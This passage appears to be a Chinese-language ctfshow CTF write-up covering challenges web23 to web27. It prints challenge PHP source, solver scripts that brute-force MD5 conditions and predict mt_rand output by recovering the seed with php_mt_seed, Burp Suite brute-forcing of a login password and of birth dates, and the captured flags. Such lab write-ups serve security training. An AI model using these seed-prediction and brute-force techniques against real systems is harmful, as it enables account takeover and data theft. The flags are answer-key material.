operator\">&amp;&amp;</span> <span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$token</span><span class=\"token punctuation\">,</span> <span class=\"token number\">14</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">===</span><span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$token</span><span class=\"token punctuation\">,</span> <span class=\"token number\">17</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token function\">intval</span><span class=\"token punctuation\">(</span><span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$token</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token function\">intval</span><span class=\"token punctuation\">(</span><span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$token</span><span class=\"token punctuation\">,</span> <span class=\"token number\">14</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$token</span><span class=\"token punctuation\">,</span> <span class=\"token number\">17</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">/</span><span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$token</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">===</span><span class=\"token function\">intval</span><span class=\"token punctuation\">(</span><span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$token</span><span class=\"token punctuation\">,</span> <span class=\"token number\">31</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>            <span class=\"token keyword\">echo</span> <span class=\"token variable\">$flag</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>payload：</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span><span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$i</span><span class=\"token operator\">&lt;</span><span class=\"token number\">10000</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$i</span><span class=\"token operator\">++</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t<span class=\"token variable\">$token</span> <span class=\"token operator\">=</span> <span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$token</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">===</span><span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$token</span><span class=\"token punctuation\">,</span> <span class=\"token number\">14</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$token</span><span class=\"token punctuation\">,</span> <span class=\"token number\">14</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">===</span><span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$token</span><span class=\"token punctuation\">,</span> <span class=\"token number\">17</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token function\">intval</span><span class=\"token punctuation\">(</span><span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$token</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token function\">intval</span><span class=\"token punctuation\">(</span><span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$token</span><span class=\"token punctuation\">,</span> <span class=\"token number\">14</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$token</span><span class=\"token punctuation\">,</span> <span class=\"token number\">17</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">/</span><span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$token</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">===</span><span class=\"token function\">intval</span><span class=\"token punctuation\">(</span><span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$token</span><span class=\"token punctuation\">,</span> <span class=\"token number\">31</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>            <span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'token='</span><span class=\"token operator\">.</span><span class=\"token variable\">$i</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'&amp;'</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'md5='</span><span class=\"token operator\">.</span><span class=\"token variable\">$token</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span> </pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>大意是从 0 循环到 10000，若某数的 MD5 满足条件，则输出此数</p>\n<p>将 payload 运行一下<img data-src=\"C:%5CUsers%5C14420%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230112191120183.png\" alt=\"image-20230112191120183\" /></p>\n<p>将结果 get 形式输入得到 flag</p>\n<pre><code>ctfshow&#123;63e95184-b8e8-4b9a-b716-f085f122cfc2&#125; \n</code></pre>\n<h2 id=\"web24\"><a class=\"anchor\" href=\"#web24\">#</a> web24</h2>\n<p>爆个🔨</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">/*</pre></td></tr><tr><td data-num=\"4\"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num=\"5\"></td><td><pre># @Author: h1xa</pre></td></tr><tr><td data-num=\"6\"></td><td><pre># @Date:   2020-09-03 13:26:39</pre></td></tr><tr><td data-num=\"7\"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num=\"8\"></td><td><pre># @Last Modified time: 2020-09-03 13:53:31</pre></td></tr><tr><td data-num=\"9\"></td><td><pre># @email: h1xa@ctfer.com</pre></td></tr><tr><td data-num=\"10\"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>*/</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"flag.php\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'r'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token variable\">$r</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'r'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token function\">mt_srand</span><span class=\"token punctuation\">(</span><span class=\"token number\">372619038</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">intval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$r</span><span class=\"token punctuation\">)</span><span class=\"token operator\">===</span><span class=\"token function\">intval</span><span class=\"token punctuation\">(</span><span class=\"token function\">mt_rand</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token variable\">$flag</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token keyword\">echo</span> <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'cat /proc/version'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token delimiter important\">?></span></span> Linux version 5.4.0-131-generic (buildd@lcy02-amd64-108) (gcc version 9.4.0 (Ubuntu 9.4.0-1ubuntu1~20.04.1)) #147-Ubuntu SMP Fri Oct 14 17:07:22 UTC 2022 Linux version 5.4.0-131-generic (buildd@lcy02-amd64-108) (gcc version 9.4.0 (Ubuntu 9.4.0-1ubuntu1~20.04.1)) #147-Ubuntu SMP Fri Oct 14 17:07:22 UTC 2022</pre></td></tr></table></figure><p>网上搜索了 mt_srand 函数使用</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">mt_srand</span><span class=\"token punctuation\">(</span><span class=\"token function\">mktime</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">echo</span><span class=\"token punctuation\">(</span><span class=\"token function\">mt_rand</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>payload：</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">mt_srand</span><span class=\"token punctuation\">(</span><span class=\"token number\">372619038</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">echo</span><span class=\"token punctuation\">(</span><span class=\"token function\">mt_rand</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>GET 形式输出得到 flag</p>\n<pre><code>ctfshow&#123;5065d66d-72ca-4749-8cde-61c9518cf77a&#125;\n</code></pre>\n<h2 id=\"web25\"><a class=\"anchor\" href=\"#web25\">#</a> web25</h2>\n<p>爆个🔨，不爆了</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">/*</pre></td></tr><tr><td data-num=\"4\"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num=\"5\"></td><td><pre># @Author: h1xa</pre></td></tr><tr><td data-num=\"6\"></td><td><pre># @Date:   2020-09-03 13:56:57</pre></td></tr><tr><td data-num=\"7\"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num=\"8\"></td><td><pre># @Last Modified time: 2020-09-03 15:47:33</pre></td></tr><tr><td data-num=\"9\"></td><td><pre># @email: h1xa@ctfer.com</pre></td></tr><tr><td data-num=\"10\"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>*/</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"flag.php\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'r'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token variable\">$r</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'r'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token function\">mt_srand</span><span class=\"token punctuation\">(</span><span class=\"token function\">hexdec</span><span class=\"token punctuation\">(</span><span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$flag</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token variable\">$rand</span> <span class=\"token operator\">=</span> <span class=\"token function\">intval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$r</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-</span><span class=\"token function\">intval</span><span class=\"token punctuation\">(</span><span class=\"token function\">mt_rand</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token variable\">$rand</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_COOKIE</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'token'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">==</span><span class=\"token punctuation\">(</span><span class=\"token function\">mt_rand</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token function\">mt_rand</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>            <span class=\"token keyword\">echo</span> <span class=\"token variable\">$flag</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token variable\">$rand</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token keyword\">echo</span> <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'cat /proc/version'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>Linux version <span class=\"token number\">5.4</span><span class=\"token number\">.0</span><span class=\"token operator\">-</span><span class=\"token number\">131</span><span class=\"token operator\">-</span><span class=\"token function\">generic</span> <span class=\"token punctuation\">(</span>buildd@lcy02<span class=\"token operator\">-</span>amd64<span class=\"token operator\">-</span><span class=\"token number\">108</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">(</span>gcc version <span class=\"token number\">9.4</span><span class=\"token number\">.0</span> <span class=\"token punctuation\">(</span>Ubuntu <span class=\"token number\">9.4</span><span class=\"token number\">.0</span><span class=\"token operator\">-</span><span class=\"token number\">1</span>ubuntu1<span class=\"token operator\">~</span><span class=\"token number\">20.04</span><span class=\"token number\">.1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#147-Ubuntu SMP Fri Oct 14 17:07:22 UTC 2022 Linux version 5.4.0-131-generic (buildd@lcy02-amd64-108) (gcc version 9.4.0 (Ubuntu 9.4.0-1ubuntu1~20.04.1)) #147-Ubuntu SMP Fri Oct 14 17:07:22 UTC 2022</span></span></pre></td></tr></table></figure><p>首先进行代码审计，mt_srand (seed) 是发放 seed 种子然后靠 mt_srand 生成随机数，这里没有给出 seed，所以我们需要通过工具逆向推出 seed</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">mt_srand</span><span class=\"token punctuation\">(</span><span class=\"token function\">hexdec</span><span class=\"token punctuation\">(</span><span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$flag</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>$rand 不为 true，则返回 true，所以通过 GET 形式 $r=0 得到第一个随机数的负数，如果 $_COOKIE ['token'] 等于两个 mt_rand () 随机数的和则输出 flag</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token variable\">$rand</span> <span class=\"token operator\">=</span> <span class=\"token function\">intval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$r</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-</span><span class=\"token function\">intval</span><span class=\"token punctuation\">(</span><span class=\"token function\">mt_rand</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token variable\">$rand</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_COOKIE</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'token'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">==</span><span class=\"token punctuation\">(</span><span class=\"token function\">mt_rand</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token function\">mt_rand</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>            <span class=\"token keyword\">echo</span> <span class=\"token variable\">$flag</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token variable\">$rand</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>打开 kali，这里我们用 php_mt_seed，我们选用 php7 的 seed<img data-src=\"C:%5CUsers%5C14420%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230112214156354.png\" alt=\"image-20230112214156354\" /></p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>payload：</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">mt_srand</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x3b63da0d</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">mt_rand</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token function\">mt_rand</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token function\">mt_rand</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>得到 token 的随机数，我们 burpsuite 抓包，在 cookie 上添加 token 和第二第三次随机数的和，在 GET 形式输出第一次获得的随机数得到 flag</p>\n<p><img data-src=\"C:%5CUsers%5C14420%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230112214343855.png\" alt=\"image-20230112214343855\" /></p>\n<pre><code>ctfshow&#123;64cc811c-54b6-4906-acd0-91469d377dd0&#125;\n</code></pre>\n<h2 id=\"web26\"><a class=\"anchor\" href=\"#web26\">#</a> web26</h2>\n<p>这个可以爆</p>\n<p><img data-src=\"C:%5CUsers%5C14420%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230112221911435.png\" alt=\"image-20230112221911435\" /></p>\n<p>burpsuite 抓包爆破密码<img data-src=\"C:%5CUsers%5C14420%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230112224351604.png\" alt=\"image-20230112224351604\" /></p>\n<pre><code>ctfshow&#123;19e3283c-f4d3-4249-9f87-780ae05a38ac&#125;\n</code></pre>\n<h2 id=\"web27\"><a class=\"anchor\" href=\"#web27\">#</a> web27</h2>\n<p>CTFshow 菜鸡学院招生啦！</p>\n<p>下载录取名单，看到录取名单和查询系统可知，就是爆破出生日期，这里以第二个为例</p>\n<p><img data-src=\"C:%5CUsers%5C14420%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230112235736885.png\" alt=\"image-20230112235736885\" /></p>\n<p><img data-src=\"C:%5CUsers%5C14420%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230112235755997.png\" alt=\"image-20230112235755997\" /></p>\n<p>首先用 burpsuite 抓包，这里我用火狐抓不到包，所以用了其他浏览器</p>\n<p><img data-src=\"C:%5CUsers%5C14420%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230112235851636.png\" alt=\"image-20230112235851636\" /></p>\n<p><img data-src=\"C:%5CUsers%5C14420%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230113000029376.png\" alt=\"image-20230113000029376\" /></p>\n<p>选择爆破变量</p>\n<p><img data-src=\"C:%5CUsers%5C14420%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230113000044670.png\" alt=\"image-20230113000044670\" /></p>\n<p>选择日期类型，格式 yyyyMMdd 后开始爆破</p>\n<p><img 